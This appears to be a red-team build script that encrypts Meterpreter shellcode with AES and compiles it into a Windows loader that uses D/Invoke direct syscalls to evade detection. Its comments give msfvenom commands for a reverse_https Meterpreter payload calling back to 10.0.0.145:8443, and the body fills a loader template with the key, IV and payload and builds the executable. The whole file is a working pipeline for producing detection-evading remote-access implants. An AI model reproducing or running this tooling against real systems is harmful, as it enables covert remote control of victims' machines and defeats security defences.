#!/bin/bash

## Version 0.2, using D/Invoke with direct syscalls

lhost="10.0.0.145"
lport="8443"
arch="x64"
c2type="meterpreter"

echo 'lhost: '$lhost
echo 'lport: '$lport
echo 'arch:  '$arch
echo 'c2type:'$c2type

mkdir tmp
mkdir output

### To Generate a Meterpreter implant shellcode without obfuscation:
# for x64
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/$rawscfilename
# for x86
# msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/$rawscfilename
### Move the meterpreter.bin to folder input if required, then run the autogen script.

rawscfilename='meterpreter.bin'
rawscfilename_enc=$rawscfilename'.enc'

sleep 2

cp aesloader2_template.txt tmp/aesloadermono_mp.cs

mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt

encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/aesloadermono_mp.cs
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/aesloadermono_mp.cs
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/aesloadermono_mp.cs
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/aesloadermono_mp.cs
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/aesloadermono_mp.cs
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/aesloadermono_mp.cs
sed -i '' -f /dev/stdin tmp/aesloadermono_mp.cs << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

if [ $arch = 'x64' ]
then
    mono-csc -out:output/aesloadermono_mp_x64.exe -platform:x64 -unsafe tmp/aesloadermono_mp.cs
fi

if [ $arch = 'x86' ]
then
    mono-csc -out:output/aesloadermono_mp_x86.exe -platform:x86 -unsafe tmp/aesloadermono_mp.cs
fi